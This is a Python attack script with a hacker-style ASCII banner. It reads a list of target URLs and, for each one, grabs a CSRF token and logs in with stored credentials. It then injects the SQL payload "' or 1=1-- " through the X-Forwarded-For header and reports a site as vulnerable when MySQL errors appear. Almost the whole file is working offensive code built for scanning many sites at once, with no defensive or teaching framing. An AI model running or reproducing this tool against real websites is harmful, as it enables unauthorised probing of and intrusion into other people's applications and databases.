import requests
import re
import sys
import os

# ASCII banner
print('''
███████╗██╗  ██╗███████╗██╗     ██╗      ██████╗  ██████╗ ████████╗
██╔════╝██║  ██║██╔════╝██║     ██║     ██╔═══██╗██╔═══██╗╚══██╔══╝
█████╗  ███████║█████╗  ██║     ██║     ██║   ██║██║   ██║   ██║   
██╔══╝  ██╔══██║██╔══╝  ██║     ██║     ██║   ██║██║   ██║   ██║   
██║     ██║  ██║███████╗███████╗███████╗╚██████╔╝╚██████╔╝   ██║   
╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝ ╚═════╝  ╚═════╝    ╚═╝   
''')

def exploit(url, payload):
    session = requests.Session()
    # set user agent and referer headers
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
        'Referer': url
    }

    # Get csrf token
    response = session.get(url, headers=headers)
    csrf_token = re.search(r'name="csrf_token" value="(.+?)"', response.text).group(1)

    # Login with credentials
    with open('username.txt', 'r') as f:
        username = f.read().strip()
    with open('password.txt', 'r') as f:
        password = f.read().strip()
    data = {
        'username': username,
        'password': password,
        'csrf_token': csrf_token
    }
    session.post(url, headers=headers, data=data)

    # SQLi payload
    payload = payload

    # Set cookies and headers for injection
    cookie = session.cookies.get_dict()
    cookie_string = ''
    for key, value in cookie.items():
        cookie_string += f'{key}={value}; '
    headers['Cookie'] = cookie_string
    headers['X-Forwarded-For'] = payload

    # Send payload and check for SQL error
    response = session.get(url, headers=headers)
    if re.search(r"SQL syntax.*MySQL", response.text):
        print(f"[+] SQL Injection vulnerability found: {url}")
    else:
        print(f"[-] SQL Injection vulnerability not found: {url}")

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <path_to_urls_file>")
        sys.exit()

    urls_file = sys.argv[1]
    if not os.path.isfile(urls_file):
        print(f"[-] File not found: {urls_file}")
        sys.exit()

    # Read URLs from file and run exploit on each one
    with open(urls_file, 'r') as f:
        urls = f.read().splitlines()
    for url in urls:
        exploit(url, "' or 1=1-- ")
